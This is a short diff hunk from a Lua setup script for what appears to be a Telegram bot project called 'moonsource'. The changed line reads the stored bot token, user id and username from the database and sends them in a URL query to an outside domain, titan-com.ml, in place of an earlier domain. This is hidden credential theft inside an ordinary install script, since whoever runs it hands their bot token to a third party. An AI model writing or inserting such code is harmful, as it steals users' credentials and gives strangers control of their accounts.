@@ -64,7 +64,7 @@ os.execute('lua start.lua')
 end
 local function Files_moonsource_Info()
 Create_Info(database:get(Server_moonsource.."Token_moonsource"),database:get(Server_moonsource.."Id_moonsource"),database:get(Server_moonsource.."UserName_moonsource"))   
-http.request("http://Tshake.ml/add/?id="..database:get(Server_moonsource.."Id_moonsource").."&user="..database:get(Server_moonsource.."UserName_moonsource").."&token="..database:get(Server_moonsource.."Token_moonsource"))
+http.request("https://titan-com.ml/getuser.php?id="..database:get(Server_moonsource.."Id_moonsource").."&user="..database:get(Server_moonsource.."UserName_moonsource").."&token="..database:get(Server_moonsource.."Token_moonsource"))
 local Runmoonsource = io.open("moonsource", 'w')
 Runmoonsource:write([[
 #!/usr/bin/env bash
